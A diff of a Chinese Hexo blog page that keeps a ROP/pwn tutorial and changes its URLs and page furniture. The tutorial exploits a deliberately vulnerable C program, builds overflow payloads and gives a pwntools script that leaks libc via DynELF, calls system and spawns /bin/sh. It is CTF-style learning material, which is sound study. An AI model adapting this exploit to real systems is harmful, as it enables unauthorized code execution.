@@ -94,20 +94,20 @@
 
 
 <meta name="description" content="一 、序ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。参考文章">
-<meta property="og:type" content="article">
+<meta property="og:type" content="website">
 <meta property="og:title" content="PWN 学习之 ROP篇">
-<meta property="og:url" content="http://yoursite.com/2017/05/07/PWN 学习之 ROP篇/index.html">
+<meta property="og:url" content="http://yoursite.com/test/PWN 学习之 ROP篇.html">
 <meta property="og:site_name" content="L">
 <meta property="og:description" content="一 、序ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。参考文章">
-<meta property="og:image" content="http://yoursite.com/2017/05/07/PWN%20学习之%20ROP篇/images/14940916866912/14941651361767.png">
-<meta property="og:image" content="http://yoursite.com/2017/05/07/PWN%20学习之%20ROP篇/images/14940916866912/14941652944059.png">
-<meta property="og:image" content="http://yoursite.com/2017/05/07/PWN%20学习之%20ROP篇/images/14940916866912/14941654146332.png">
-<meta property="og:image" content="http://yoursite.com/2017/05/07/PWN%20学习之%20ROP篇/images/14940916866912/14941748383625.png">
+<meta property="og:image" content="http://yoursite.com/test/images/14940916866912/14941651361767.png">
+<meta property="og:image" content="http://yoursite.com/test/images/14940916866912/14941652944059.png">
+<meta property="og:image" content="http://yoursite.com/test/images/14940916866912/14941654146332.png">
+<meta property="og:image" content="http://yoursite.com/test/images/14940916866912/14941748383625.png">
 <meta property="og:updated_time" content="2017-06-03T16:39:50.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PWN 学习之 ROP篇">
 <meta name="twitter:description" content="一 、序ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。参考文章">
-<meta name="twitter:image" content="http://yoursite.com/2017/05/07/PWN%20学习之%20ROP篇/images/14940916866912/14941651361767.png">
+<meta name="twitter:image" content="http://yoursite.com/test/images/14940916866912/14941651361767.png">
 
 
 
@@ -135,7 +135,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/05/07/PWN 学习之 ROP篇/"/>
+  <link rel="canonical" href="http://yoursite.com/test/PWN 学习之 ROP篇.html"/>
 
 
 
@@ -272,113 +272,17 @@
             
 
   <div id="posts" class="posts-expand">
-    
+  <header class="post-header">
 
-  
+	<h1 class="post-title" itemprop="name headline">PWN 学习之 ROP篇</h1>
 
-  
-  
-  
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/07/PWN 学习之 ROP篇/">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Lucaks">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/blog_head.jpeg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="L">
-    </span>
+</header>
 
     
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">PWN 学习之 ROP篇</h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-07T01:28:06+08:00">
-                2017-05-07
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index">
-                    <span itemprop="name">PWN</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/05/07/PWN 学习之 ROP篇/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/05/07/PWN 学习之 ROP篇/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
     
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <h2 id="一-、序"><a href="#一-、序" class="headerlink" title="一 、序"></a>一 、序</h2><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。<a href="http://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.11.MtR4jX&amp;articleid=403" target="_blank" rel="external">参考文章</a><br><a id="more"></a></p>
+      <h2 id="一-、序"><a href="#一-、序" class="headerlink" title="一 、序"></a>一 、序</h2><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。<a href="http://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.11.MtR4jX&amp;articleid=403" target="_blank" rel="external">参考文章</a><br><a id="more"></a></p>
 <h2 id="程序流劫持"><a href="#程序流劫持" class="headerlink" title="程序流劫持"></a>程序流劫持</h2><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。但是如果上来就部署全部的防御，初学者可能会觉得无从下手，所以我们先从最简单的没有任何保护的程序开始，随后再一步步增加各种防御措施，接着再学习绕过的方法，循序渐进。<br>首先来看这个有明显缓冲区溢出的程序：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;</div><div class="line">	char buf[128];</div><div class="line">	read(STDIN_FILENO, buf, 256);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">	vulnerable_function();</div><div class="line">	write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <h4 id="1-无防护"><a href="#1-无防护" class="headerlink" title="1.无防护"></a>1.无防护</h4><p>在没有任何防护的情况下，我们可以直接在栈上执行我们的shellcode，并且函数加载地址不会每次都变化。我们需要通过一个pattern生成定位字符串找到我们的溢出点。当我们找到溢出点后就可以构造 “A”*n+ret的字符串，就可以让pc执行ret地址上的代码了。<strong>ret:栈顶字单元出栈，其值赋给IP寄存器。 即实现了一个程序的转移，将栈顶字单元保存的偏移地址作为下一条指令的偏移地址。</strong><br>此处我们可以利用buffer，将我们的shellcode放置到上面。然后通过ret控制eip跳转到我们的shellcode上。<code>[shellcode][&#39;AAAAA......&#39;][ret]</code>。<br>此处我们需要的注意的是gdb调试环境会影响buf在内存中的地址。虽然我们关闭了ASLR,但是只能保证buf的地址在gdb的调试环境中不会变化，但当我们直接执行程序的时候，buf的地址会固定在别的地址上。我们可以开启core dump这个功能</p>
@@ -400,69 +304,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env pythonfrom pwn import *p = process(&apos;./level2&apos;)elf = ELF(&apos;level2&apos;)#p = remote(&apos;127.0.0.1&apos;, 10003)plt_write= elf.symbols[&apos;write&apos;]plt_read  = elf.symbols[&apos;read&apos;]print &apos;plt_write= &apos; + hex(plt_write)print &apos;plr_read= &apos;+hex(plt_read)vulfun_addr = 0x8048436print &apos;vulfun= &apos; + hex(vulfun_addr)main_addr=elf.symbols[&apos;main&apos;]def leak(address):	payload=&quot;A&quot;*140+p32(plt_write)+p32(main_addr)+p32(1)+p32(address)+p32(4)	p.sendline(payload)	data=p.recv(4)	log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;)))	return dataprint recvline()dynelf=DynELF(leak,elf=ELF(&quot;level2&quot;))systemAddress=dynelf.lookup(&apos;system&apos;,&apos;libc&apos;)print &quot;systemAddress: &quot;,hex(systemAddress)bss_addr=elf.symbols[&apos;__bss_start&apos;]print &quot;bss_addr: &quot;,hex(bss_addr)pop_addr=0x80484bdpayload1=&quot;A&quot;*140+p32(plt_read)+p32(pop_addr)+p32(0)+p32(bss_addr)+p32(8)payload1+=p32(systemAddress)+p32(vulfun_addr)+p32(bss_addr)p.sendline(payload1)p.sendline(&quot;/bin/sh\0&quot;)p.interactive()</div></pre></td></tr></table></figure>
 <p>效果图：<br><img src="images/14940916866912/14941748383625.png" alt=""></p>
 
-      
-    </div>
-
-    <div>
-      
-        
-
-      
-    </div>
-
-    <div>
-      
-        
-
-      
-    </div>
-
-    <div>
-      
-        
-
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2017/05/02/ init_array下断/" rel="next" title="init_array下断">
-                <i class="fa fa-chevron-left"></i> init_array下断
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/06/01/使用dumpdecrypted 砸壳/" rel="prev" title="使用dumpdecrypted 砸壳">
-                使用dumpdecrypted 砸壳 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
+    
   </div>
 
 
@@ -526,7 +368,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-count">1</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -537,7 +379,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-count">1</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -700,10 +542,10 @@
 
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
 <script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
 
-
+  
 
   
 
@@ -724,8 +566,8 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://yoursite.com/2017/05/07/PWN 学习之 ROP篇/';
-          this.page.identifier = '2017/05/07/PWN 学习之 ROP篇/';
+          this.page.url = 'http://yoursite.com/test/PWN 学习之 ROP篇.html';
+          this.page.identifier = 'test/PWN 学习之 ROP篇.html';
           this.page.title = 'PWN 学习之 ROP篇';
         };
         var d = document, s = d.createElement('script');
